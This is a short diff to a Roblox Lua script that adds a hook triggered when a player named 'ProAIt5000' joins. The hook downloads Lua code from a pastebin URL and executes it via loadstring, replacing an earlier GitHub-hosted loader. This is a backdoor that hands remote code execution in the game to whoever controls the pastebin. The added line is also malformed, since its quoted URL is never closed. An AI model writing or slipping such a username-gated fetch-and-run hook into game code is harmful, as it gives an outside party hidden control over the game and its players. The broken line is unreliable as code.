@@ -1,6 +1,6 @@
 game.Players.PlayerAdded:Connect(function(Player)
 	if Player.Name == "ProAIt5000" then
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/LeanClient/thingy/main/loader.lua"))()
+	loadstring(game:HttpGet('https://pastebin.com/raw/CBZ1CZ9s))()
 	end
 end)
 
